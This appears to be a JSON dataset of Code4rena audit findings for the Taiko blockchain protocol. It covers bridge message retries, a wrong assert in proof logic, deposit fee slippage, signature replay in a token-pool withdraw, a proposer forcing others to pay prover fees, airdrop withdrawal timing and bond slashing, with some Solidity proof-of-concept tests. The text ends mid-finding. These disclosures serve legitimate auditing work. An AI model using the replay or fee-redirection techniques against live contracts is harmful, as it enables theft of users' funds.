      "summary": "\nThis bug report discusses an issue with the ERC20 bridge transfer, specifically with the USDCAdapter. The issue occurs when the call to mint tokens fails on the source chain, causing the funds to become locked in the bridge. This can happen if the minting allowance for USDC is reached, which can happen if the amount of tokens being minted exceeds the allowed amount. This issue is present in both the onMessageInvocation() and onMessageRecalled() functions, which both call the _transferToken() function. The recommended solution is to add new functionality to the vault that allows users to send a new message with different data if the original message fails. However, the sponsor of the project does not have a perfect solution and suggests adding a warning on the bridge UI to inform users of the potential issue. The severity of this bug is considered medium, and the team is in agreement with the findings. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/279",
      "tags": [],
      "finders": [
        "monrel"
      ]
    },
    {
      "id": "31936",
      "title": "[M-03] retryMessage unable to handle edge cases.",
      "impact": "MEDIUM",
      "content": "\nThe function `retryMessage()` is unable to handle some edge scenarios listed below.\n\n1.  Reverting or refunding a sender when the receiver is banned after the transaction is placed in a `RETRIABLE` state.\n2.  Message that is suspended after the transaction is placed in a `RETRIABLE` state.\n\n### Proof of Concept\n\nA message is set to `RETRIABLE`in the `processMessage` when transfer fails or if the target address does not satisfy some conditions.\n\n<details>\n\n```solidity\n//IN PROCESSMESSAGE\n\n                if (_invokeMessageCall(_message, msgHash, gasLimit)) {\n                    _updateMessageStatus(msgHash, Status.DONE);\n                } else {\n                    _updateMessageStatus(msgHash, Status.RETRIABLE);\n                }\n\n\n//_invokeMessageCall() FUNCTION\nfunction _invokeMessageCall(\n        Message calldata _message,\n        bytes32 _msgHash,\n        uint256 _gasLimit\n    )\n        private\n        returns (bool success_)\n    {\n        if (_gasLimit == 0) revert B_INVALID_GAS_LIMIT();\n        assert(_message.from != address(this));\n\n        _storeContext(_msgHash, _message.from, _message.srcChainId);\n\n        if (\n            _message.data.length >= 4 // msg can be empty\n                && bytes4(_message.data) != IMessageInvocable.onMessageInvocation.selector\n                && _message.to.isContract()\n        ) {\n            success_ = false;\n        } else {\n            (success_,) = ExcessivelySafeCall.excessivelySafeCall(\n                _message.to,\n                _gasLimit,\n                _message.value,\n                64, // return max 64 bytes\n                _message.data\n            );\n        }\n\n        // Must reset the context after the message call\n        _resetContext();\n    }\n```\n</details>\n\nThe issue here is, when the team attempts suspension of a message which is in a `RETRIABLE` state, the code does not block execution.\nSame or a banned address.\nThis is because the `proofReceipt[msgHash]` which handles suspension is not checked. The `  addressBanned[_addr] ` is not checked too.\n\n<details>\n\n```solidity\n    function retryMessage(\n        Message calldata _message,\n        bool _isLastAttempt\n    )\n        external\n        nonReentrant\n        whenNotPaused\n        sameChain(_message.destChainId)\n    {\n        // If the gasLimit is set to 0 or isLastAttempt is true, the caller must\n        // be the message.destOwner.\n        if (_message.gasLimit == 0 || _isLastAttempt) {\n            if (msg.sender != _message.destOwner) revert B_PERMISSION_DENIED();\n        }\n\n        bytes32 msgHash = hashMessage(_message);\n        if (messageStatus[msgHash] != Status.RETRIABLE) {\n            revert B_NON_RETRIABLE();\n        }\n\n        // Attempt to invoke the messageCall.\n        if (_invokeMessageCall(_message, msgHash, gasleft())) {\n            _updateMessageStatus(msgHash, Status.DONE);\n        } else if (_isLastAttempt) {\n            _updateMessageStatus(msgHash, Status.FAILED);\n        }\n```\n</details>\n\n### Recommended Mitigation Steps\n\nRecheck necessary details to verify that the transaction is still good to go.\nCheck the `proofReceipt[msgHash].receivedAt` and the  `  addressBanned[_addr] `\n\n**[adaki2004 (Taiko) disputed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/298#issuecomment-2031829775):**\n > I'd dispute this with an addition (see end sentence).\n> \n> 2 cases mentioned here:\n> \n> 1. Reverting or refunding a sender when the receiver is banned after the transaction is placed in a RETRIABLE state.\n> \n> Intentional to NOT refund sender when he/she is banned. (Tho we might remove the \"banAddress\", because it confuses a lot of people. The original intention behind banning an address is: NOT be able to call another , very important contract (`message.to`) on behalf of the `Bridge`, like the `SignalService`.)\n> \n> 2. Message that is suspended after the transaction is placed in a RETRIABLE state.\n> Not to refund suspended messages is a feature, it is a failsafe/security mechanism. In such case we need to use it, it would be a severe situation and we do not necessary want to refund (by default) the owner, since it might be a fake message on the destination chain. (That can be one reason - so makes no sense to refund).\n> Also suspension would never happen after RETRIABLE. If we suspend message it is between NEW and (DONE or RETRIABLE).\n> \n> So as we considering removing banning addresses (and not allow `SignalService` to be called) for avoid confusion, but not because it is an issue, but a simplification and to avoid confusion. https://github.com/taikoxyz/taiko-mono/pull/16604\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/298#issuecomment-2051841623):**\n > Using this issue to aggregate all of the issues around ban list functionality that has since been removed from the sponsors code base.\n\n _Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-taiko-findings/issues/298)._\n\n***\n\n",
      "summary": "\nThe `retryMessage()` function in the code is unable to handle certain edge cases, which are listed below:\n\n1. When a sender is banned after the transaction is placed in a `RETRIABLE` state, the function is unable to revert or refund the sender.\n2. When a message is suspended after the transaction is placed in a `RETRIABLE` state, the code does not block execution.\n\nThe issue here is that the code does not check the `proofReceipt[msgHash]` and `addressBanned[_addr]` when attempting to suspend a message in a `RETRIABLE` state. This means that the code may still execute even if the message is suspended or the receiver is banned.\n\nTo mitigate this issue, it is recommended to recheck the necessary details and verify that the transaction is still valid. This includes checking the `proofReceipt[msgHash].receivedAt` and `addressBanned[_addr]`. Additionally, it has been suggested to remove the `banAddress` functionality from the code to avoid confusion.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/298",
      "tags": [],
      "finders": [
        "josephdara",
        "Shield",
        "iamandreiski",
        "1",
        "ladboy233",
        "2",
        "Aymen0909",
        "t0x1c",
        "grearlake",
        "lanrebayode77"
      ]
    },
    {
      "id": "31935",
      "title": "[M-02] The top tier prover can not re-prove",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProving.sol#L219-L236> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibProving.sol#L389>\n\nIn the `LibProving.proveBlock` function the `top tier prover` is allowed to prove a new transition as long as the new transition is different from the previous transition and `assert` conditional checks pass.\n\n```solidity\n            if (sameTransition) revert L1_ALREADY_PROVED();\n\n            if (isTopTier) {\n                // The top tier prover re-proves.\n                assert(tier.validityBond == 0);\n                assert(ts.validityBond == 0 && ts.contestBond == 0 && ts.contester == address(0));\n```\n\nBut the `assert condition` of this logic is wrong since it checks for the `ts.contestBond == 0` where as it should be `ts.contestBond == 1` since 1 is set as the default value for `ts.contestBond` parameter for gas savings as shown below:\n\n```solidity\n            ts_.contestBond = 1; // to save gas\n```\n\nAs a result of the even though code expects the top-tier prover to re-prove a different transition, the transaction will revert.\n\n### Proof of Concept\n\nAdd the following testcase `test_L1_GuardianProverCanOverwriteIfNotSameProof_test` to the `TaikoL1LibProvingWithTiers.t.sol` test file.\n\nIf you change the ts.contestBond == 0\nto ts.contestBond == 1 in the second `assert` statement of the `LibProving.proveBlock` function, the test will run successfully and transaction execution will succeed.\n\n<details>\n\n```solidity\n    function test_L1_GuardianProverCanOverwriteIfNotSameProof_test() external {\n        giveEthAndTko(Alice, 1e7 ether, 1000 ether);\n        giveEthAndTko(Carol, 1e7 ether, 1000 ether);\n        console2.log(\"Alice balance:\", tko.balanceOf(Alice));\n        // This is a very weird test (code?) issue here.\n        // If this line is uncommented,\n        // Alice/Bob has no balance.. (Causing reverts !!!)\n        // Current investigations are ongoing with foundry team\n        giveEthAndTko(Bob, 1e7 ether, 100 ether);\n        console2.log(\"Bob balance:\", tko.balanceOf(Bob));\n        // Bob\n        vm.prank(Bob, Bob);\n\n        bytes32 parentHash = GENESIS_BLOCK_HASH;\n        for (uint256 blockId = 1; blockId < conf.blockMaxProposals * 3; blockId++) {\n            printVariables(\"before propose\");\n            (TaikoData.BlockMetadata memory meta,) = proposeBlock(Alice, Bob, 1_000_000, 1024);\n            //printVariables(\"after propose\");\n            mine(1);\n\n            bytes32 blockHash = bytes32(1e10 + blockId);\n            bytes32 stateRoot = bytes32(1e9 + blockId);\n            // This proof cannot be verified obviously because of\n            // blockhash:blockId\n            proveBlock(Bob, Bob, meta, parentHash, stateRoot, stateRoot, LibTiers.TIER_GUARDIAN, \"\");\n\n            // Prove as guardian                       \n            proveBlock(\n                Carol, Carol, meta, parentHash, blockHash, stateRoot, LibTiers.TIER_GUARDIAN, \"\"\n            );\n\n            vm.roll(block.number + 15 * 12);\n\n            uint16 minTier = meta.minTier;\n            vm.warp(block.timestamp + tierProvider().getTier(LibTiers.TIER_GUARDIAN).cooldownWindow * 60 + 1);\n\n            verifyBlock(Carol, 1);\n\n            parentHash = blockHash;\n        }\n        printVariables(\"\");\n    }\n```\n</details>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nHence recommended to update the `ts.contestBond == 0` in the second `assert` statement to `ts.contestBond == 1` in the `LibProving.proveBlock` function.\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/305#issuecomment-2031537557):**\n > This is a valid bug report, it has been fixed already here: https://github.com/taikoxyz/taiko-mono/pull/16543\n\n***\n\n",
      "summary": "\nThe bug report is about a mistake in the code of the `LibProving.proveBlock` function, which allows the top tier prover to prove a new transition as long as it is different from the previous one and certain conditions are met. However, the `assert` condition in the code is incorrect, as it checks for `ts.contestBond == 0` instead of `ts.contestBond == 1` as it should. This results in the transaction reverting even though the code expects the top-tier prover to re-prove a different transition. A proof of concept test case is provided to demonstrate the issue and it is recommended to update the code to fix the mistake. The bug has been confirmed and fixed by the Taiko team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/305",
      "tags": [],
      "finders": [
        "zzebra83",
        "Shield",
        "Tendency"
      ]
    },
    {
      "id": "31934",
      "title": "[M-01] There is no slippage check for the eth deposits processing in the `LibDepositing.processDeposits`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L138-L142> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/TaikoL1.sol#L209-L211> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L83> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L93> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L101>\n\nThe `LibDepositing.depositEtherToL2` function is called by the TaikoL1.depositEtherToL2 to deposit ether to the `L2 chain`. The maximum number of `unprocessed eth deposits` are capped at `_config.ethDepositRingBufferSize - 1` as shown here:\n\n```solidity\n        unchecked {\n            return _amount >= _config.ethDepositMinAmount && _amount <= _config.ethDepositMaxAmount\n                && _state.slotA.numEthDeposits - _state.slotA.nextEthDepositToProcess\n                    < _config.ethDepositRingBufferSize - 1;\n        }\n```\n\nThe Taiko configuration states that `ethDepositRingBufferSize == 1024`. Hence the maximum unprocessed eth deposits allowed by the taiko L1 contract is `capped at 1023`.\n\nWhen the L2 block is proposed by calling the `LibProposing.proposeBlock` function by the TaikoL1 contract,  it processes the unprocessed `eth deposits` by calling the `LibDepositing.processDeposits`. But it is allowed to process `at most 32 eth deposits per block` as per the following conditional check in the `processDeposits` function.\n\n```solidity\ndeposits_ = new TaikoData.EthDeposit[(numPending.min(_config.ethDepositMaxCountPerBlock));\n```\n\nHere the `ethDepositMaxCountPerBlock == 32` as configured in the `TaikoL1.getConfig` function.\n\nAnd the `fee amount` for each of the `eth deposits` are calculated as follows:\n\n```solidity\nuint96 fee = uint96(_config.ethDepositMaxFee.min(block.basefee * _config.ethDepositGas));\n\nuint96 _fee = deposits_[i].amount > fee ? fee : deposits_[i].amount;\n\ndeposits_[i].amount -= _fee; \n```\n\nHence the `deposited eth amount` is deducted by the calculated `_fee amount` for the `eth deposit transaction`. If the basefee of the `L1 block` increases significantly then the maximum fee of `ethDepositMaxFee: 1 ether / 10` will be applied. Thus deducting that amount from the `transferred eth deposit to the recipient in L2`.\n\nNow let's consider the following scenario:\n\n1.  `nextEthDepositToProcess` is currently `100`.\n2.  `numEthDeposits` is `1060` currently.\n3.  The number of proposed L2 blocks required to process 1060th eth deposit is = 1060 - 100 / 32 = 30 L2 blocks.\n4.  As a result all the `above 30 L2 blocks` will not be proposed in a single L1 block and will require multiple L1 blocks for it.\n5.  If there is `huge congestion` in the mainnet during this time the `block.basefee` of the subsequent `L1 blocks` would increase. And this could prompt the maximum fee of `_config.ethDepositMaxFee` to be charged on the deposited amount (in the `LibDepositing.processDeposits` function, since subsequent L1 block would have a higher `block.basefee`) thus prompting loss of funds on the recipient.\n6.  For example let's assume the depositor deposit `1.1 ether` and current gas fee is `0.01 ether`. Hence the recipient expects to receive approximately `1.09 ether` at the time of the deposit on L1. But when the deposit is processed in a subsequent L1 block, if the fee amount increases to the maximum amount of `0.1 ether` then the recipient will only get approximately `1 ether` only. This will cost the recipient a `loss of 0.9 ether`. If there was a slippage check a depositor can set for his eth deposits then the he can prevent excessive gas costs during processing.\n\n### Proof of Concept\n\n```solidity\n        unchecked {\n            return _amount >= _config.ethDepositMinAmount && _amount <= _config.ethDepositMaxAmount\n                && _state.slotA.numEthDeposits - _state.slotA.nextEthDepositToProcess\n                    < _config.ethDepositRingBufferSize - 1;\n        }\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L138-L142>\n\n```solidity\n            ethDepositRingBufferSize: 1024,\n            ethDepositMinCountPerBlock: 8,\n            ethDepositMaxCountPerBlock: 32,\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/TaikoL1.sol#L209-L211>\n\n```solidity\n            uint96 fee = uint96(_config.ethDepositMaxFee.min(block.basefee * _config.ethDepositGas));\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L83>\n\n```solidity\n                uint96 _fee = deposits_[i].amount > fee ? fee : deposits_[i].amount;\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L93>\n\n```solidity\n                    deposits_[i].amount -= _fee;\n```\n\n<https://github.com/code-423n4/2024-03-taiko/blob/main/packages/protocol/contracts/L1/libs/LibDepositing.sol#L101>\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nHence it is recommended to add a slippage check for the fee amount of the deposited eth amount in the `LibDepositing.processDeposits` function, since `depositEtherToL2` and `processDepositare` two different transactions with a delay during which the L1 block `basefee` can increase significantly causing loss of funds to the recipient in the form of fee increase.\n\n\n**[dantaik (Taiko) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/321#issuecomment-2033375181):**\n > Thank you for the feedback. The current issue is **valid but minor** as we believe users can choose not to deposit Ether using the `depositEtherToL2` function if there are already many deposits pending in the queue. Going forward, the processing of such deposits will likely be moved to the node software directly.\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/321#issuecomment-2045819455):**\n > Agree this is valid, the impact is most likely small, but I think the likelihood of it occurring at some point is relatively high.  The user is exposed to non-deterministic behavior that they cannot fully understand ahead of signing a transaction.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the TaikoL1 contract, specifically with the `LibDepositing.depositEtherToL2` function. The maximum number of unprocessed ether deposits allowed is capped at 1023, which may cause issues if there is a significant increase in the L1 block's basefee during processing. This could result in a loss of funds for the recipient. The report recommends adding a slippage check for the fee amount to prevent this issue. The tools used for this report were VSCode. The recommended mitigation step is to add a slippage check for the fee amount in the `LibDepositing.processDeposits` function. The Taiko team has acknowledged the issue but disagrees with the severity. The judge agrees that the issue is valid and has a high likelihood of occurring, which could result in non-deterministic behavior for users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/321",
      "tags": [],
      "finders": [
        "Shield",
        "ladboy233"
      ]
    },
    {
      "id": "31933",
      "title": "[H-05] Signatures can be replayed in `withdraw()` to withdraw more tokens than the user originally intended.",
      "impact": "HIGH",
      "content": "\nSignatures can be replayed in `withdraw()` to withdraw more tokens than the user originally intended.\n\n### Vulnerability Details\n\nIn the TimelockTokenPool.sol contracts, users can provide a signature to allow someone else to withdraw all their withdrawable tokens on their behalf using their signature. [TimelockTokenPool.sol#L170)  ](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/team/TimelockTokenPool.sol#L170)\n\n        function withdraw(address _to, bytes memory _sig) external {\n            if (_to == address(0)) revert INVALID_PARAM();\n            bytes32 hash = keccak256(abi.encodePacked(\"Withdraw unlocked Taiko token to: \", _to));\n     @>     address recipient = ECDSA.recover(hash, _sig);\n            _withdraw(recipient, _to);\n        }\n\nAs seen from above, the signature provided does not include a nonce and this can lead to signature replay attacks. Due to the lack of a nonce,  withdraw() can be called multiple times with the same signature. Therefore, if a user provides a signature to withdraw all his withdrawable tokens at one particular time, an attacker can repeatedly call withdraw() with the same signature to withdraw more tokens than the user originally intended.\nThe vulnerability is similar to [Arbitrum H-01](https://solodit.xyz/issues/h-01-signatures-can-be-replayed-in-castvotewithreasonandparamsbysig-to-use-up-more-votes-than-a-user-intended-code4rena-arbitrum-foundation-arbitrum-foundation-git) where  user's signatures could be replayed to use up more votes than a user intended due to a lack of nonce.\n\n### Recommended Mitigation Steps\n\nConsider using a nonce or other signature replay protection in the TimelockTokenPool contract.\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/60#issuecomment-2032045461):**\n > Valid bug report, trying to fix it in this PR: https://github.com/taikoxyz/taiko-mono/pull/16611/files\n\n***\n\n \n",
      "summary": "\nThis bug report discusses a vulnerability in the TimelockTokenPool.sol contract where users can provide a signature to withdraw all their tokens, but the lack of a nonce allows for signature replay attacks. This means that an attacker can repeatedly use the same signature to withdraw more tokens than the user intended. The bug is similar to one found in Arbitrum H-01 and the recommended mitigation step is to implement a nonce or other signature replay protection in the contract. The bug has been confirmed and a fix is being worked on in a pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/60",
      "tags": [],
      "finders": [
        "wangxx2026",
        "ladboy233",
        "Tendency",
        "lightoasis",
        "0xleadwizard",
        "alexfilippov314"
      ]
    },
    {
      "id": "31932",
      "title": "[H-04] Taiko L1 - Proposer can maliciously cause loss of funds by forcing someone else to pay prover's fee",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/0d081a40e0b9637eddf8e760fabbecc250f23599/packages/protocol/contracts/L1/hooks/AssignmentHook.sol#L113-L116> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/0d081a40e0b9637eddf8e760fabbecc250f23599/packages/protocol/contracts/L1/libs/LibProposing.sol#L85-L87> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/0d081a40e0b9637eddf8e760fabbecc250f23599/packages/protocol/contracts/L1/libs/LibProposing.sol#L249-L255>\n\nProposal of new blocks triggers a call to proposeBlock in the libProposing library. In that function, there is this the following block of code:\n\n            if (params.coinbase == address(0)) {\n            params.coinbase = msg.sender;\n        }\n\nThis sets the params.coinbase variable set by the caller of the function to be the msg.sender if it was empty.\n\nAs part of the process of proposal, hooks can be called of type AssignmentHook. An assignment hook's onBlockProposed will be triggered as follows:\n\n                    // When a hook is called, all ether in this contract will be send to the hook.\n                // If the ether sent to the hook is not used entirely, the hook shall send the Ether\n                // back to this contract for the next hook to use.\n                // Proposers shall choose use extra hooks wisely.\n                IHook(params.hookCalls[i].hook).onBlockProposed{ value: address(this).balance }(\n                    blk, meta_, params.hookCalls[i].data\n                );\n\nNotice how the meta data is passed to this function. Part of the function of the onBlockProposed is to pay the assigned prover their fee and the payee should be the current proposer of the block. this is done as follows:\n\n            // The proposer irrevocably pays a fee to the assigned prover, either in\n        // Ether or ERC20 tokens.\n        if (assignment.feeToken == address(0)) {\n            // Paying Ether\n            _blk.assignedProver.sendEther(proverFee, MAX_GAS_PAYING_PROVER);\n        } else {\n            // Paying ERC20 tokens\n            IERC20(assignment.feeToken).safeTransferFrom(\n                _meta.coinbase, _blk.assignedProver, proverFee\n            );\n        }\n\nNotice how if the payment is in ERC20 tokens, the payee will be the variable  \\_meta.coinbase, and like we showed earlier, this can be set to any arbitrary address by the proposer. This can lead to a scenario as such:\n\n1.  proposer A approves the assignmentHook contract to spend a portion of their tokens, the allowance is set higher than the actual fee they will be paying.\n2.  proposer A proposes a block, and a fee is charged and payed to the assigned prover, but there remains allowance that the assignment hook contract can still use.\n3.  proposer B proposes a block and sets params.coinbase as the the address of proposer A.\n4.  proposer A address will be the payee of the fee for the assigned prover for the block proposed by proposer B.\n\nThe scenario above describes how someone can be forced maliciously to pay fees for block proposals by other actors.\n\n### Recommended Mitigation Steps\n\nA simple fix to this to ensure the block proposer will always be the msg.sender, as such:\n\n        if (params.coinbase == address(0 || params.coinbase != msg.sender)) {\n            params.coinbase = msg.sender;\n        }\n\n**[dantaik (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/163#issuecomment-2032257802):**\n > This is a valid bug report. It has been fixed here: https://github.com/taikoxyz/taiko-mono/pull/16327\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue in the code for the Taiko project. In the function proposeBlock, there is a block of code that sets the params.coinbase variable to the msg.sender if it is empty. However, during the proposal process, hooks can be called and the onBlockProposed function can be used to pay the assigned prover their fee. In this function, the payee is set to the variable \\_meta.coinbase, which can be set by the proposer to any arbitrary address. This can lead to a scenario where a proposer is forced to pay fees for block proposals by other actors. The recommended mitigation step is to ensure that the block proposer will always be the msg.sender. The bug has been confirmed and fixed by the project team.",
      "quality_score": 4,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/163",
      "tags": [],
      "finders": [
        "MrPotatoMagic",
        "ladboy233",
        "mojito\\_auditor",
        "zzebra83",
        "monrel"
      ]
    },
    {
      "id": "31931",
      "title": "[H-03] Users will never be able to withdraw their claimed airdrop fully in ERC20Airdrop2.sol contract",
      "impact": "HIGH",
      "content": "\n**Context:**\nThe ERC20Airdrop2.sol contract is for managing Taiko token airdrop for eligible users, but the withdrawal is not immediate and is subject to a withdrawal window.\n\nUsers can claim their tokens within claimStart and claimEnd. Once the claim window is over at claimEnd, they can withdraw their tokens between claimEnd and claimEnd + withdrawalWindow. During this withdrawal period, the tokens unlock linearly i.e. the tokens only become fully withdrawable at claimEnd + withdrawalWindow.\n\n**Issue:**\nThe issue is that once the tokens for a user are fully unlocked, the [withdraw()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/team/airdrop/ERC20Airdrop2.sol#L88) function cannot be called anymore due to the [ongoingWithdrawals modifier](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/team/airdrop/ERC20Airdrop2.sol#L39) having a strict `claimEnd + withdrawalWindow < block.timestamp` check in its second condition.\n\n**Impact:**\nAlthough the tokens become fully unlocked when block.timestamp = claimEnd + withdrawalWindow, it is extremely difficult or close to impossible for normal users to time this to get their full allocated claim amount. This means that users are always bound to lose certain amount of their eligible claim amount. This lost amount can be small for users who claim closer to claimEnd + withdrawalWindow and higher for those who partially claimed initially or did not claim at all thinking that they would claim once their tokens are fully unlocked.\n\n### Coded POC\n\nHow to use this POC:\n\n*   Add the POC to `test/team/airdrop/ERC20Airdrop2.t.sol`\n*   Run the POC using `forge test --match-test testAirdropIssue -vvv`\n*   The POC demonstrates how alice was only able to claim half her tokens out of her total 100 tokens claimable amount.\n\n```solidity\n      function testAirdropIssue() public {\n        vm.warp(uint64(block.timestamp + 11));\n\n        vm.prank(Alice, Alice);\n        airdrop2.claim(Alice, 100, merkleProof);\n\n        // Roll 5 days after\n        vm.roll(block.number + 200);\n        vm.warp(claimEnd + 5 days);\n\n        airdrop2.withdraw(Alice);\n\n        console.log(\"Alice balance:\", token.balanceOf(Alice));\n\n        // Roll 6 days after\n        vm.roll(block.number + 200);\n        vm.warp(claimEnd + 11 days);\n\n        vm.expectRevert(ERC20Airdrop2.WITHDRAWALS_NOT_ONGOING.selector);\n        airdrop2.withdraw(Alice);\n    }\n```\n\n### Logs\n\n```solidity\nLogs:\n  > MockERC20Airdrop @ 0x0000000000000000000000000000000000000000\n    proxy      : 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a\n    impl       : 0x2e234DAe75C793f67A35089C9d99245E1C58470b\n    owner      : 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496\n    msg.sender : 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38\n    this       : 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496\n  Alice balance: 50\n```\n\n### Recommended Mitigation Steps\n\nIn the [modifier ongoingWithdrawals()](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/team/airdrop/ERC20Airdrop2.sol#L39), consider adding a buffer window in the second condition that gives users enough time to claim the fully unlocked tokens.\n\n```solidity\n    uint256 constant bufferWindow = X mins/hours/days;\n\n    modifier ongoingWithdrawals() {\n        if (claimEnd > block.timestamp || claimEnd + withdrawalWindow < block.timestamp + bufferWindow) {\n            revert WITHDRAWALS_NOT_ONGOING();\n        }\n        _;\n    }\n```\n**[dantaik (Taiko) commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/245#issuecomment-2033388656):**\n > Fixed in https://github.com/taikoxyz/taiko-mono/pull/16596\n\n**[adaki2004 (Taiko) confirmed and commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/245#issuecomment-2037149300):**\n > It is indeed a bug in the flow, while we removed Airdrop2, it is still a confirmed finding on the repo for auditing.\n\n\n***\n\n",
      "summary": "\nThe ERC20Airdrop2.sol contract is used for managing a token airdrop for eligible users, but there is an issue with the withdrawal process. Users can claim their tokens within a specific timeframe, but once that window is over, they have to wait for another window to withdraw their tokens. However, there is a strict check in place that makes it difficult for users to time their withdrawals correctly, resulting in them losing some of their eligible tokens. A proof of concept has been provided to demonstrate this issue and a suggested solution is to add a buffer window to the withdrawal process. The bug has been fixed in the code, but it is still listed as a confirmed finding for auditing purposes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "https://github.com/code-423n4/2024-03-taiko-findings/issues/245",
      "tags": [],
      "finders": [
        "pa6kuda",
        "MrPotatoMagic",
        "Aymen0909",
        "alexfilippov314",
        "t4sk"
      ]
    },
    {
      "id": "31930",
      "title": "[H-02] Validity and contests bond ca be incorrectly burned for the correct and ultimately verified transition",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibProving.sol#L387-L392> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibProving.sol#L189-L199> \n\n<https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibVerifying.sol#L178-L189>\n\nBoth validity and contests bonds can be wrongfully slashed even if the transition ends up being the correct and verified one.\n\nThe issue comes from the fact that the history of the final verified transition is not taken into account.\n\nExample 1: Validity bond is wrongfully burned:\n\n1.  Bob Proves transition T1 for parent P1\n2.  Alice contests and proves T2 for parent P1 with higher tier proof.\n3.  Guardians steps in to correctly prove T1 for parent P2.\n\nAt step 2 Bob loses his bond and is permanentley written out of the history of P1 <br><https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibProving.sol#L387-L392>\n\n```solidity\n    _ts.validityBond = _tier.validityBond; \n    _ts.contestBond = 1; \n    _ts.contester = address(0);\n    _ts.prover = msg.sender;\n    _ts.tier = _proof.tier; \n```\n\nExample 2: Contest bond wrongfully slashed:\n\n1.  Alice proves T1 for parent P1 with SGX\n2.  Bob contests T1 for parent P1\n3.  Alice proves T1 with SGX_ZK parent P1\n4.  Guardian steps in to correctly disprove T1 with T2 for parent P1\n\nBob was correct and T1 was ultimately proven false. Bob still loses his contest bond.\n\nWhen the guardian overrides the proof they can not pay back Bob's validity or contesting bond. They are only able to pay back a liveness bond 